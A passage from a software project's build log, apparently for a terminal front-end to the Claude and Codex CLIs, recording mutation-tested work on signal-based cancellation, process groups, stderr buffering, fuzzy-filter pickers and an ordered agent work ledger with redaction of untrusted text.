replays the whole conversation on every turn, so kolk's transcript is intact and the vendor's copy is
the only casualty. The line therefore reports **what changed** — the next turn starts a fresh
conversation, your transcript is intact — rather than raising an alarm about data loss that did not
happen. A warning that overstates its own severity gets ignored, including the time it matters.

**And it stays quiet for the person who pressed Ctrl-C.** §2.5 marks a user cancellation
`Silent:true`. Someone who just cancelled their own turn knows why the provider stopped; the notice
would arrive on *every* cancellation, attached to the thing they deliberately did. Silence there is
the feature, which is why it has its own test rather than being left to a reviewer to notice.

**Written through `onToken`, not `watch`.** `watch` sets `streamed`, which decides whether a turn may
be retried at all — and a notice is not half an answer. Routing the trail around that flag keeps
"content reached the user" meaning what the retry logic needs it to mean.

**Why the typed code is not here.** `provider.Meta` has no warnings field: §2.6's amendment A2 is
unbuilt, and A7's three `Warn*` codes with it. Inventing a private one inside `agentcli` would
create the second warning vocabulary those amendments exist to prevent. Prose through the existing
trail channel is the honest interim, and it is recorded as interim rather than ticked.

Acceptance checklist:

- [x] red first: the retirement explained to nobody, with the streamed output printed.
- [x] the silent case proven separately, since "does not appear" is invisible in a passing test
  that only asserts presence.
- [x] proven non-vacuous by mutation: announcing unconditionally fails the cancellation test with
  the full unwanted line in the failure.
- [x] `-race` green; full `make check` green: **2,542 tests, 0 lint issues**.
- [ ] **not done, and not ticked:** `WarnHistoryLost` as a typed warning (needs A2 + A7), and the
  `<prior-conversation>` prompt label.

### S10.1d4 built — and mutation testing found the bug in the fix

§2.5's starred rule: a SIGTERM/SIGKILL exit **invalidates the vendor conversation**, because the
vendor *continues an unfinished turn* on `--resume`. Resuming after a hard exit therefore lets the
vendor silently execute the tool calls kolk already told the user were cancelled — editing files
after a "cancelled" turn, and permanently diverging kolk's transcript from the vendor's. The ladder
(S10.1d3) gave the vendor its chance to finish; nothing acted on the case where it did not take it.

**Retiring the handle costs nothing, which is why this was safe to do alone.** `promptFromMessages`
serialises the entire conversation on every turn, so kolk replays its own transcript regardless of
what the vendor remembers. The `<prior-conversation>` label and `WarnHistoryLost` that §2.5 also
asks for are a *notification* concern, split out as S10.1d5 rather than allowed to hold up the fix
that stops files being edited after a cancellation.

**The predicate was wrong on the first draft, and mutation testing is the only reason it is not
still wrong.** `exitedHard` originally excluded SIGINT, reasoning from §2.5's "SIGINT ends the turn
gracefully and still produces a result frame". Deleting the exclusion changed no test. The branch
was never reached: the test meant to cover it used a child that *exits cleanly* after SIGINT, whose
wait status is not signalled at all, so the comparison never ran.

Re-reading it with that in hand showed the line was not merely dead but **wrong**. A process that
*handles* a signal exits with a code of its own choosing and is never signalled. A wait status that
IS signalled means no handler ran — no result frame, an unfinished turn — and that is equally true
of SIGINT. The exclusion would have called a SIGINT-killed vendor resumable, which is the exact
failure the rule exists to prevent. The predicate is now `status.Signaled()`, with no exception, and
`mockagent.KilledByInterrupt` covers the branch that had none.

Acceptance checklist:

- [x] red first at the level that matters — a second turn issuing `--resume` with the same handle
  after the first process was killed, printed in the failure.
- [x] the fix proven at the backend: a hard exit retires the handle, and the next turn claims a
  fresh `--session-id` with a different value.
- [x] both signal outcomes proven on real processes: a clean exit after SIGINT is not a hard exit,
  and being killed — by SIGTERM or by SIGINT — is.
- [x] mutation re-run after the correction: reinstating the SIGINT exclusion now fails
  `TestBeingKilledByInterruptIsStillAHardExit`, where before it failed nothing.
- [x] `-race` green across `agentcli` and `shell`.
- [x] full `make check` green: **2,540 tests, 0 lint issues**.

### S10.1d3 built — the ladder, and the fake vendors that make it provable

Cancellation went straight to SIGKILL. §2.5 says start at SIGINT, and the reason is not politeness:
the vendor documents that SIGINT ends the turn gracefully and **still produces a `result` frame**,
which carries the turn's accounting — so Ctrl-C stops being a hole in the dashboard. The starred
rule is heavier still: a SIGTERM/SIGKILL exit **invalidates the vendor session**, because the vendor
resumes an *unfinished* turn on `--resume`. Killing first therefore risks the vendor later executing
tool calls kolk already reported as cancelled. Reaching for SIGKILL was a correctness failure
wearing the costume of a rude one.

**`internal/mockagent` earns its place here, exactly as predicted two leaves ago.** No stock POSIX
tool will ignore SIGINT on request, so the escalation could not be observed with `sh -c`. Two fake
vendors — one that exits on SIGINT, one that traps it and leaves only on SIGTERM — each appending
the signals it received to a log. **That log is the evidence.** An exit status cannot distinguish
the rungs once a child picks its own exit code; the child's own record can. Only the two kinds this
leaf needed were built; the write-end holder arrives with the drain that needs it.

**The race detector found a bug in this leaf's own design.** The graces are variables so a test can
walk three rungs without spending seven seconds, and the ladder goroutine was reading them while a
test adjusted them. The fix is better than a mutex: the schedule is read on the goroutine that
starts the child and captured, because the graces belong to the child **as configured at spawn**,
not to whatever the package happens to hold when cancellation lands.

**One test taught something about POSIX rather than about kolk.** `TestLinesProcessCancelKills-
TheWholeProcessGroup` began failing once the ladder existed, because its grandchild is `sleep 30 &`
and POSIX makes a background job in a non-interactive shell **ignore SIGINT**. It genuinely
survives rung 1 and dies on rung 2 — the test was right, the ladder was right, and the old
expectation had been written for an immediate SIGKILL.

Acceptance checklist:

- [x] red first, failing on the missing ladder, then on the missing rung.
- [x] proven non-vacuous by mutation: starting the schedule at SIGTERM fails both tests, and the
  reported signals are `[TERM]` where `[INT, TERM]` belongs — the exact §2.5 violation.
- [x] `-race` green, after the detector caught this leaf's own data race and it was fixed by
  capture rather than by locking.
- [x] Windows refused rather than faked — `writeFake` there returns an error naming A13, because a
  green signal-ladder test on a platform with no ladder would mean nothing.
- [x] the architecture gate's `runtime.GOOS` rule obeyed: build-tagged files, not a runtime branch.
- [x] full `make check` green: **2,536 tests, 0 lint issues**.

### S10.1d2 (part) built — the long-lived child gets the rule the one-shot already had

`command()` in `exec_unix.go` has put every one-shot in its own process group since the beginning,
with `TestTimeoutKillsTheWholeProcessGroup` to keep `Setpgid` load-bearing. `StartLinesProcess` —
the child that lives for the **whole session** rather than one command — had neither. The reason
the rule exists is stronger here, not weaker: running the vendor's own tool loop is the entire
premise of this backend, so a `bash`, an `npm test`, a language server it starts are all kolk's
grandchildren, and `exec.CommandContext`'s default cancel signals only the direct child.

**The test's own runtime is the evidence.** Before the fix it failed in 30.01 s — the orphaned
`sleep 30` held the pipe, so the deferred `Close` waited for it. After, the same test passes in
0.04 s. A cancellation that takes 750× the cancel is not a cancellation, which is the observation
`TestTimeoutKillsTheWholeProcessGroup` already records for the other path.

**Windows is worse here and says so.** `groupChild` is a no-op there for the same reason `command()`
does not tear down a group: it needs a job object, which A13 owns. A persistent provider child
therefore leaks its grandchildren on Windows. Written into `exec_windows.go` beside the existing
note, so the port has a defect to fix rather than a silence to discover.

Acceptance checklist:

- [x] red first, failing for its intended reason — a named grandchild pid still alive after the
  session was cancelled.
- [x] proven non-vacuous by mutation: dropping `Setpgid` while keeping the `Cancel` hook restores
  the 30 s failure, since `killGroup`'s negative pid then resolves to no group.
- [x] `-race` green, and the windows/amd64 cross-build green with the honest no-op.
- [x] full `make check` green: **2,534 tests, 0 lint issues**.
- [ ] **not done, and not ticked:** the bounded drain that does not kill on `result` (P6). The
  SIGINT-first ladder (S10.1d3, shipped), `EPIPE`-tolerant async stdin (S10.1d7, shipped), and the
  drain that keeps cancelled-turn accounting (S10.1d6, shipped) were all built after this list was
  written. Only the **read-end close** remains genuinely open.

### S10.1d1 built — a session-long buffer nobody was emptying

S2 asks for a stderr **ring**. `StartLinesProcess` had a `bytes.Buffer`, and the difference is not
stylistic. This process is the one B12.5 made persistent: **one child serves every turn of a
Kolkrabbi session.** Its stderr was appended to for the entire life of that session and never
drained, so a vendor that narrates to stderr — a progress line per tool call, a deprecation notice
per turn — grew kolk's memory for as long as someone kept working.

**The second defect is the one a user would actually have seen.** On a failed exit the whole buffer
went into the error: `fmt.Errorf("provider process exited unsuccessfully: %s: %w", stderr.String(),
…)`. That string is what reaches the terminal and the session transcript. A chatty vendor turned one
failed turn into as much output as it had ever written — and the part that says *why* it failed is
the last line, which is exactly the part a reader has to scroll past everything else to find.

**So the ring keeps the tail, and says when it dropped anything.** "The last 8 KiB" and "all of it"
lead a reader to different next questions, and nothing in the text itself distinguishes them, so the
elision is named rather than silent.

**It carries its own mutex, which is not decoration.** `os/exec` writes stderr from its own
goroutine while the reader goroutine reads it at exit. A `bytes.Buffer` across that boundary is a
data race the detector only reports when a child happens to be chatty at the moment it dies — the
kind that passes CI for months. `-race` is green with the mutex.

Acceptance checklist:

- [x] red first: 3,000 stderr lines then a real cause then `exit 3`, asserting bounded size, the
  tail kept, and the head discarded. It failed to compile first on the missing constant, then
  failed on the assertion.
- [x] proven non-vacuous by mutation — keeping the head instead of the tail is the plausible wrong
  implementation, and the failure output shows `noise line 0` retained with the cause gone.
- [x] `-race` green across the package, which is the point of the mutex.
- [x] full `make check` green: **2,533 tests, 0 lint issues**, cold start 3.2 ms p50.

**On `internal/mockagent`, which this leaf did not create.** S2 names "four fake binaries", but the
package's own tests already drive real children through `sh -c` and `cat`, and that idiom reached
this defect without a new package. Scaffolding nobody needed yet is scaffolding to maintain, so it
is not built. If S10.1d2's cancel ladder needs a child that ignores `SIGINT` — and it will — that is
the moment mockagent earns its place.
- [ ] **S10.1e the priority-1 captures** — the four `claude-error-*` streams and
  `claude-init-apikey` (§10.3 prices all of them at **$0**; four are already observed live), plus
  `claude-isolated.ndjson`, the CONTRACT fixture, at ~2¢. Needs the owner's vendor login, so it is
  the one leaf here that cannot be done offline.

## H — the TUI's pickers match Claude Code's and Codex's, not just `/model`

Opened 2026-08-30. The owner asked for every option surface — not only `/model` — to filter live
while typing and to feel like Claude Code's and Codex's own pickers. Two concrete gaps drove the
scope: `/model`'s full-screen overlay has arrow-key navigation but **no text filter at all** once
open, and `/config` bare has **no overlay whatsoever** — it falls straight through to the
non-interactive CLI dump. `H` is the first unused top-level letter (checked against every letter in
this file: `A–G, I, L, M, P, R, S, T, U, W, X` are taken; `H, J, K, N, O, Q, V, Y, Z` are free).

Two decisions the owner made explicitly before any code, so a later reader does not have to guess
why the simpler path was chosen: matched-character highlighting (bolding the letters that matched,
like fzf) is **deferred** rather than shipped now — the rendering core (`writeStyled`/`viewRow` in
`model.go`) supports exactly one style per whole row today, and giving it per-character spans
touches code every screen region depends on, the same class of change that caused U0.4g's
raw-terminal row-displacement bug. And in the `/model` overlay, left/right **stays** the effort dial
— the filter box takes typing and Backspace only, no mid-query cursor movement — rather than freeing
left/right for text editing and relearning the effort-cycle key.

- [x] **H0 the shared fuzzy-match primitive** — `fuzzyScore`/`fuzzyMatches` in
  `internal/tui/fuzzy.go`. See below.
- [x] **H1 applied everywhere matching happens today** — `matchesFilter` is **deleted**, not left
  behind: every one of its three call sites, the slash-menu's prefix-only match, and `@`-mention's
  plain substring match now route through `fuzzyScore`/`fuzzyScoreFields`, ranked by score. A
  second primitive (`fuzzyScoreFields`) had to be added mid-leaf — see below for why joining
  fields into one haystack the way `matchesFilter` always had was itself a latent bug once matching
  went fuzzy.
- [x] **H2 the two genuinely shared pieces of a filterable overlay** — narrower than first scoped;
  see below for why a full shared overlay skeleton was the wrong shape once a name existed for
  each piece.
- [x] **H3 the `/model` overlay filters live** — built on H2's `filterBox`. See below.
- [x] **H4 a `/config` overlay** — the literal ask. See below. `/plogin` stays inline, as scoped —
  nothing asked for an overlay there.
- [x] **H5 window the `/model` and `/config` overlays** — H2 built `scrollWindow` naming the future
  `/model` filter box and `/config` picker as the reason it existed, but H3 and H4 shipped without
  ever calling it. See below.
- [x] **H6 pasting into either filter box** — H3 and H4 wired `KeyText` into their filter boxes but
  never `KeyPaste`, which the composer has always treated as the same act of adding text. Both
  overlays silently dropped a paste. One-line fix per overlay, its own mutation-tested red/green.
- [x] **H7 five ways to own the terminal, and only some of them knew about each other** — found
  while verifying the merge that brought in a concurrently-developed PTY-attach feature (§below),
  not by anything failing on its own. See below.
- [x] **H8 Codex output and subscription model selection** — bounded provider-CLI framing,
  actionable plan shortcuts, picker-effort routing, and synchronized PTY/TUI output. See below.
- [x] **H9 post-H8 hardening** — session path confinement, cancellation ordering, complete
  GPT-5.6 plan selection, and the workflow-pin gate. See below.
- [x] **H10 ordered agent work ledger and trace polish** — keep the scheduler's proven
  dependency/write safety, but make every task's current step inspectable, persist the ordered
  lifecycle, and render compact state-aware rows instead of the present collection of unrelated
  lifecycle/tool formats. The owner explicitly superseded A33.2's old "count only" presentation
  decision after using concurrent agent mode live.

### H10 checkpoint plan — one hardened leaf at a time

- [x] **H10.0 contract and boundaries** — preserve concurrent independent readers, dependency
  ordering, and one shared-tree writer; persist every typed transition while projecting only the
  latest bounded step per task into the live TUI; keep durable milestones chronological and flush
  buffered task reports in stable plan order; never infer percentages or ETAs.
- [x] **H10.1 typed task-step state** — add queued/waiting/working/done/failed/blocked states,
  monotonic per-task step sequence, phase, and latest-step text, with transition and sanitization
  tests before wiring producers.
- [x] **H10.2 durable event ledger** — add the protocol/schema/golden contract for intermediate
  main/subagent work updates and prove concurrent publication remains globally ordered in the
  session journal.
- [x] **H10.3 scheduler projection** — publish planned, dependency-waiting, writer-waiting,
  started, fallback, checkpoint, completion, failure, and blocked transitions without changing
  which tasks may overlap.
  - [x] **H10.3a pending states** — queued, dependency-waiting, writer-waiting, blocked, and
    over-budget tasks appear once with stable identity and never inflate the running count.
  - [x] **H10.3b active states** — started, checkpoint, provider-open/fallback, success, and failure
    advance one task's sequence around its real execution boundaries.
  - [x] **H10.3c main phases and scheduler invariants** — planning, delegation, synthesis, and
    terminal main work are durable; independent readers still overlap, dependencies still wait,
    and shared-tree writers still serialize.
- [x] **H10.4 provider and Kolkrabbi tool steps** — retain typed provider-owned tool events before
  their human trail is flattened, publish Kolkrabbi-owned tool start/output/finish events, and
  update the owning task's latest step without leaking raw unbounded output into the status row.
  - [x] **H10.4a observed provider seam** — add an optional backward-compatible observed-stream
    interface so adapters retain typed provider tool/message/error boundaries while old backends keep
    the existing `StreamChat` contract.
  - [x] **H10.4b work-step producers** — map provider and Kolkrabbi tool/model boundaries to main or
    child work updates, preserving task identity and reporting one bounded latest step at a time.
    - [x] **H10.4b1 provider-to-work routing** — accept the optional provider observer at the
      retry boundary, emit only meaningful provider boundaries, and route each to its exact parent
      or child ledger without turning text deltas into an unbounded event stream.
    - [x] **H10.4b2 Kolkrabbi-tool lifecycle** — record requested/started/output/finished local
      tool work with task correlation, including denied and failed paths, while preserving the one
      executor chokepoint.
      - [x] **H10.4b2a tool-work correlation contract** — add optional, validated task/child
        coordinates to local tool events so concurrent work remains attributable without changing
        old main-tool frames.
      - [x] **H10.4b2b execution lifecycle producer** — publish one ordered local tool lifecycle
        around the existing executor and make its owning main/child ledger state name the same
        boundary.
      - [x] **H10.4b2c refusal and error producer** — make skipped, denied, and execution-error
        paths terminally legible without claiming that a tool actually ran.
    - [x] **H10.4b3 producer integration** — prove the planner, synthesis, direct-agent loop, and
      concurrent child paths have deterministic ownership and do not change scheduler overlap.
  - [x] **H10.4c micro-step hardening** — prove ordered starts/outputs/finishes, redaction and bounds,
    retries/failures/cancellation, and no duplicate or cross-task status updates.
    - [x] **H10.4c1 lifecycle ordering and ownership** — prove each executed local call has exactly
      one requested → started → output → finished chain, the matching ledger update belongs only to
      that owner, and concurrent children cannot cross-correlate or duplicate a boundary.
    - [x] **H10.4c2 redaction and bounds** — prove hostile provider/tool details and errors are
      scrubbed, terminal-safe, and bounded in the latest-step projection while durable tool output
      remains within its established safe payload limit.
    - [x] **H10.4c3 retry, failure, and cancellation** — prove a new physical provider retry opens
      one new observed step, terminal failures/cancellation remain legible, and no path emits a
      duplicate terminal lifecycle boundary.
      - [x] **H10.4c3a retry observation** — prove repeated provider message deltas coalesce within
        one physical attempt but the first message of each retry is independently durable.
      - [x] **H10.4c3b terminal error and cancellation** — prove child provider failure and parent
        cancellation each emit exactly one terminal ledger result and the matching terminal event.
- [x] **H10.5 polished presentation** — use one compact grammar and semantic state colours for
  live rows, concise chronological milestone lines, and deterministic plan-index ordering for
  full task reports; preserve `NO_COLOR`, narrow-terminal clipping, and terminal sanitization.
  - [x] **H10.5a live row grammar** — carry the latest sanitized step and sequence to the TUI,
    render one stable `agent [i/n] · model · effort · state: summary — step` row, reject stale
    replacements, and colour the row by its closed state vocabulary.
  - [x] **H10.5b milestone and report ordering** — render concise durable main/child milestones in
    journal order while retaining buffered full child reports in stable plan order.
    - [x] **H10.5b1 chronological durable replay** — render each `work.updated` frame as a compact,
      typed main or child milestone in the journal order supplied to the plain event renderer.
    - [x] **H10.5b2 stable full-report flush** — hold only buffered child prose until delegation
      completes, emit concise completion milestones when they occur, then flush verbose reports in
      plan-index order without changing dependency or writer scheduling.
  - [x] **H10.5c surface fallback hardening** — prove semantic colours respect `NO_COLOR`, narrow
    frames clip safely, and all row fields remain terminal-safe at the final renderer boundary.
- [x] **H10.6 recovery and bounds** — verify cancellation, retries, provider fallback, slow bus
  subscribers, spill-file recovery, terminal resize, long/hostile text, and race safety.
  - [x] **H10.6a journal and subscriber recovery** — prove ordered work survives spill/reopen and a
    slow replay consumer cannot stall concurrent task publication or corrupt correlation.
  - [x] **H10.6b retry/fallback/cancellation continuity** — prove provider retry, route fallback,
    and cancellation retain a monotonic, terminally legible work trail under their real boundaries.
  - [x] **H10.6c resize and hostile-surface continuity** — prove live task rows retain plan order,
    clipping, and state meaning across resize while long/hostile input never escapes the renderer.
- [x] **H10.7 full hardening gate** — targeted mutation checks for each state/ordering guard,
  package race tests, full `make check`, and acceptance evidence in `docs/build-log.md`.
  - [x] **H10.7a affected-package and specification gates** — run the engine, TUI, CLI, provider,
    protocol, and specification suites normally and under the race detector where concurrent paths
    changed.
  - [x] **H10.7b repository-wide gate** — run the repository's canonical `make check` and inspect
    every failing command rather than reducing a release gate to its final exit code.
  - [x] **H10.7c handoff audit** — confirm no temporary mutation remains, inspect the complete H10
    diff for unintended scope, record verification in the persistent build log, and leave the
    worktree ready for the user's separate commit/release decision.

### H10.1 built — a task update now says what changed, not merely that it exists

`SubagentStatus` now carries a closed observed-state and phase vocabulary, a bounded latest-step
preview, and a monotonic per-task sequence. The pure transition function permits repeated
non-terminal updates, rejects backward and post-terminal transitions, requires terminal states to
use the complete phase, folds whitespace, consumes ANSI/terminal controls as units, and truncates
before any surface sees the text. Existing start/fallback/finish lifecycle updates now advance that
sequence rather than replacing fields invisibly.

Acceptance:

- [x] red first on missing state, phase, step, sequence, and transition symbols.
- [x] engine package green normally and under `-race`; `git diff --check` green.
- [x] three independent mutations were caught by their exact tests: disabling sequence increment,
  reopening a terminal task, and removing the step bound; every mutation was reverted.
- [x] no scheduler, protocol, or presentation behavior changed in this leaf.

### H10.2 built — observed work now survives the screen that displayed it

The additive `work.updated` protocol event represents both main and subagent work with closed role,
state, and phase vocabularies; a monotonic per-work sequence; a bounded step; and strict identity
rules. Main work uses its turn ID and cannot carry child coordinates. Subagent work uses its task ID
and repeats child turn plus one-based index/total, so an isolated NDJSON row remains attributable.
The event has a schema, golden frame, Go validation, changelog entry, and a place in the now
24-event closed catalog.

Every existing subagent status replacement now publishes through the session bus. A planned
queued/waiting `work.updated` may precede `subagent.started`; once execution begins, active updates
sit between `subagent.started` and `subagent.finished`. Concurrent children retain globally
increasing bus sequence, and closing/reopening a spill file recovers both start and terminal work
updates.

Acceptance:

- [x] protocol red first on undefined event/data vocabulary, then schema/golden closure red, then
  engine red on zero emitted work updates.
- [x] `make spec` passes all 29 spec-change checks; protocol, bus, and engine are green under
  `-race`; `git diff --check` is green.
- [x] publisher removal and catalog removal mutations were caught by their exact tests.
- [x] the first correlation mutation unexpectedly passed, exposing a vacuous test whose fixture
  also violated index/total. The fixture was narrowed to child-turn alone; the same mutation then
  failed for the intended reason and was reverted.

### H10.3a built — waiting now names what it is waiting for

`runTasks` mints every task's stable task/child identity and publishes all queued rows in plan order
before launching a goroutine. Declared dependencies transition to `waiting for task …`; a runnable
writer held behind the one shared-tree writer says so once; dependency failures and budget stops
become terminal blocked updates even though those tasks never start. Pending states do not touch the
running-agent count.

Acceptance:

- [x] red fixtures observed only working/done before this leaf, no dependency/writer explanation,
  and no status at all for an over-budget task.
- [x] engine package and focused scheduler invariants pass, including under `-race`.
- [x] four independent mutations—queue notification, dependency wait, writer wait, and budget
  block—each failed its exact behavioral test and were reverted.
- [x] existing reader overlap, dependency serialization, and writer serialization tests remain
  green; this projection did not change the scheduler decision.

### H10.3b built — active work names the boundary it actually crossed

An active task now advances from `started` to rollback-checkpoint creation, provider opening, any
explicit fallback and second provider opening, optional checkpoint finalization, then exactly one
terminal result. Failures preserve the scrubbed provider error in their final step instead of being
silently flattened to `failed`; the lifecycle publisher recognizes that pre-recorded terminal state
and does not emit a duplicate row.

Acceptance:

- [x] red fixtures initially saw only queued/started/completed or a generic failure; they now pin
  checkpoint, provider-open, fallback, and reason-preserving terminal boundaries with sequence
  order.
- [x] focused active/checkpoint/fallback tests and the engine package pass normally and under
  `-race`.
- [x] four independent mutations—checkpoint start, provider open, failure reason, and terminal
  de-duplication—each failed its dedicated behavioral assertion and were reverted.

### H10.3c built — the parent is visible without pretending it is a child

The parent agent records planning, delegation, synthesis, and its terminal outcome using the parent
turn ID, with its own monotonic sequence that resets exactly at the next turn. It carries no child
turn or plan coordinates. A failed planner ends the parent work ledger explicitly before the usual
turn cancellation/finish event, so a replay can distinguish "the turn ended" from "the agent
completed its work."

Acceptance:

- [x] red integration tests first observed no parent work rows on either a successful run or planner
failure; they now prove phase order, identity, no child leakage, terminal state, and per-turn reset.
- [x] planning publisher, terminal publisher, and sequence increment mutations each fail their exact
test and were reverted.
- [x] protocol, bus, and engine pass normally and relevant packages pass under `-race`; independent
reader overlap, dependency ordering, writer serialization, and conservative unknown-kind behavior
all remain green.

### H10.4a built — provider facts survive before the display trail flattens them

`ObservedChatBackend` is an additive interface beside the unchanged `StreamChat` seam. Engine callers
can opt in when they need structured provider boundaries; gateway and test backends that only support
the original call remain valid. Claude's persistent stream, its one-shot runner, and Codex now all
emit a scrubbed, one-line `ProgressEvent` for provider message, tool start, tool finish, error, and
plan-limit boundaries. Start/finish correlation remains scoped to one stream, so an id-only vendor
completion preserves the name announced by its matching start without pretending Kolkrabbi executed
the provider's tool.

Acceptance:

- [x] direct adapter tests pin tool identity through Codex, persistent Claude, and one-shot Claude;
  a focused boundary test pins message/error/limit kinds, failed-tool marking, correlation, and
  one-line plan-limit detail.
- [x] compile-time assertions keep both supported provider backends on the optional observed-stream
  contract while existing `StreamChat` call sites retain their original signature.
- [x] five behavioral mutations were caught and reverted: dropping each Codex, persistent-Claude,
  and one-shot-Claude observer call; dropping the id-to-name cache; and blurring a provider error
  into ordinary message prose.
- [x] `git diff --check`, normal provider/adapter tests, and their `-race` variants pass.

### H10.4b1 built — provider observations reach the work owner, not the transcript by accident

The retry boundary has an additive observed-stream path: it calls an `ObservedChatBackend` when the
caller asks for provider progress and falls back unchanged to `ChatBackend.StreamChat` otherwise.
The first text delta in each physical attempt becomes one `model is responding` observation; later
deltas cannot flood the persistent work ledger. Tool starts, finishes, errors, and plan limits stay
individual. The child adapter advances only the matching task's status; the parent adapter records
the same compact step as main work with no child coordinates. Planner and synthesis now use that
path, as does the direct agent loop when it is reached from agent mode.

Acceptance:

- [x] a concurrent two-child fixture proves provider work from each observed backend stays on that
  child's ledger; a main-ledger fixture proves parent identity, provider phase, sequence, and
  one-text-delta coalescing.
- [x] a complete two-task agent run proves its real planner and synthesis calls use the observed
  path, rather than a unit test merely invoking the helper directly.
- [x] three behavioral mutations were caught and reverted: dropping the child observer, bypassing
  the planner observer, and allowing every message delta into the main work ledger.
- [x] `git diff --check`, engine tests, and engine `-race` pass.

### H10.4b2a built — a tool event can say whose concurrent work it describes

All four tool lifecycle payloads now have additive `task_id` and `child_turn` fields. They are
omitted for main work, preserving old JSON frames byte-for-byte; when either is present, both must
be canonical `k_`/`t_` identifiers. A concurrent consumer can therefore attribute local tool events
to the same durable child ledger that owns the matching `work.updated` row, instead of trying to
infer ownership from interleaved parent-turn timestamps.

Acceptance:

- [x] typed frames for requested, started, output, and finished events accept one paired child
  correlation; every partial or malformed pair is rejected on every event type.
- [x] all four JSON schemas describe the optional non-empty fields, while existing golden frames
  and their exact typed round trips remain unchanged.
- [x] validator removal and schema-field removal mutations each fail their dedicated tests and were
  reverted.
- [x] `git diff --check`, protocol normal/race tests, and `make spec` pass.

### H10.4b2b built — one existing tool executor now has an observable lifecycle

The main and subagent loops both call one local-tool publisher around the existing `tools.Execute`
path. A call produces `tool.requested → tool.started → tool.output → tool.finished`, marked as
`kolk`-executed. Child events include their task/child pair; direct agent work omits both. The same
start and finish boundaries advance the owning work ledger with a compact tool description, never
tool output. No executor was duplicated or moved: permission, timeout, checkpoint, and output
scrubbing remain in their previous chokepoint.

Acceptance:

- [x] a real subagent `list_dir` call proves event order, child correlation, and matching child
  start/finish work rows; a one-task agent run proves the direct main path has the same event order,
  deliberately omits child coordinates, and advances main tool work.
- [x] removing a child start boundary, one child task coordinate, or the main finished boundary each
  fails its focused behavioral assertion and was reverted.
- [x] `git diff --check`, engine/protocol normal tests, and both package race tests pass.

### H10.4b2c built — a refusal is visible without being rewritten as a tool run

An executor failure remains a real run: it emits the full lifecycle and `tool.finished.ok:false`,
and the owner reports `failed <tool>`. A doomed repeat is different. Its request and denial output
remain durable, but it has no start or finished event because it never reached the executor; its
work ledger instead says `skipped <tool>: repeated call`. This preserves the useful evidence without
creating a false audit trail that claims Kolkrabbi ran an action it deliberately prevented.

Acceptance:

- [x] a three-call subagent loop proves the first two calls have complete lifecycles while the
  guarded third has requested/output only and an explicit skipped work step.
- [x] a local missing-file failure proves its finished event is `ok:false` and its child ledger names
  the failed tool.
- [x] removing the skipped step, changing failure to `ok:true`, and adding a false start to a skipped
  call each fail their focused regression and were reverted.
- [x] `git diff --check`, engine/protocol normal and race tests, and `make spec` pass.

### H10.4b3 built — every producer is wired without changing who may overlap

Provider observation now covers the real planner and synthesis calls; the direct agent fallback
carries parent provider and local-tool work; and concurrent children carry their own provider and
Kolkrabbi-tool records. A two-child local-tool fixture proves that global bus interleaving does not
mix their task IDs or change each individual lifecycle order. The scheduler itself was not rewritten:
the pre-existing reader-overlap, width-limit, dependency, writer-serialization, and unknown-kind
tests still exercise the same decisions.

Acceptance:

- [x] concurrent child local-tool events retain their exact task owner and ordered per-tool lifecycle;
  planner/synthesis, direct-agent, provider and local-tool paths are each covered by real runs in
  the preceding H10.4b leaves.
- [x] all previous targeted producer mutations remain covered, and the full engine race suite plus
  the unchanged scheduler invariant suite remain green.
- [x] `git diff --check`, protocol tests, and `make spec` pass.

### H10.4c1 built — local-tool audit chains stay exact under real interleaving

The concurrent-child regression now deliberately gives both providers the same local call ID. It
proves that call ID is never used as an ownership shortcut: every child instead has exactly one
`requested → started → output → finished` chain under its own paired task and child-turn
coordinates. Each child’s live ledger has exactly its own tool-start and tool-finish row, in order;
one child cannot receive another’s status update even while the global journal interleaves work.

Acceptance:

- [x] a two-child real local-tool run with identical call IDs proves complete per-owner event
  chains, exact task/child coordinates, two and only two local tool rows per child, and consecutive
  per-task sequences.
- [x] three focused mutations failed the same regression and were reverted byte-identically:
  omitting `child_turn` from one `tool.started`, publishing a duplicate `tool.finished`, and routing
  every child tool row to index zero.
- [x] focused main/child, skipped, error, and concurrent lifecycle tests plus the concurrent test
  under `-race` pass; `git diff --check` passes.

### H10.4c2 built — hostile details cannot turn a status row or request frame into a leak

Provider progress now applies its 160-rune terminal-safe compaction after composing the event's
name and detail, rather than only to the two fragments. Local tool descriptions now scrub command,
description, path, and fallback name before rendering the live row. Local `tool.requested` data
also scrubs its provider-supplied name and JSON arguments before serialization; the bus retains its
existing defensive scrub as a second boundary. Tool output continues to use the existing executor
cap and output scrubber, and never becomes a live work-step string.

Acceptance:

- [x] hostile provider name/detail input containing an ANSI escape, a key-shaped value, and hundreds
  of runes produces a redacted, control-free work step at or below 160 runes.
- [x] a real child `bash` call proves key-shaped arguments, output, and status detail stay redacted
  in the durable journal and live row; a direct request-data construction test proves the producer
  itself scrubs before the bus receives it.
- [x] a real over-12KB `read_file` result proves the durable output retains the existing truncation
  bound and redaction while the associated status row contains neither output nor the secret.
- [x] removing final provider compaction, request-frame scrubbing, or description scrubbing each
  fails its dedicated regression and was reverted; full engine normal and `-race` suites plus
  `git diff --check` pass.

### H10.4c3a built — one retry is one newly observable provider attempt

The provider retry latch remains inside the physical-attempt loop. Several message deltas from one
stream still create one `model is responding` step, but an HTTP 429 retry begins a new attempt and
therefore creates one new step with the next main-work sequence. This avoids event floods without
making a waiting retry look stalled.

Acceptance:

- [x] an observed backend emits two message deltas, returns 429, then emits two more and succeeds;
  exactly two ordered provider work rows result.
- [x] widening `messageSeen` to the whole retry loop makes that regression fail because the retry
  loses its visible step; the mutation was reverted.
- [x] focused main/provider/retry/cancellation tests and the retry regression under `-race` pass;
  `git diff --check` passes.

### H10.4c3b built — terminal work says failure or cancellation once, and only once

A child provider failure keeps its precise failed complete work row and publishes exactly one
`subagent.finished` frame with `ok:false`. A cancelled parent planning call publishes one terminal
main row (`failed` state with the explicit `cancelled` step), one `turn.cancelled`, and no normal
turn-finished event. The closed work-state vocabulary has no fictional cancellation state; the step
therefore carries the truthful distinction without weakening the protocol contract.

Acceptance:

- [x] a real failed child provider run proves one failed-complete child work row, one matching
  terminal status, and one `subagent.finished(ok:false)` frame.
- [x] a cancellable observed planner run proves one cancelled terminal main work row, one
  `turn.cancelled`, and no `turn.finished`; bounded handshakes prevent the test from hanging.
- [x] duplicating either child `subagent.finished` or the parent terminal work publish makes its
  dedicated regression fail; both mutations were reverted.
- [x] full engine normal and `-race`, protocol tests, `make spec`, and `git diff --check` pass.

### H10.5a built — one compact row now says which task moved and how

The TUI adapter retains the engine's latest sanitized `Step`, `Phase`, and monotonic `Sequence`
instead of reducing a task to a static planner title. Each live row now has one predictable shape:
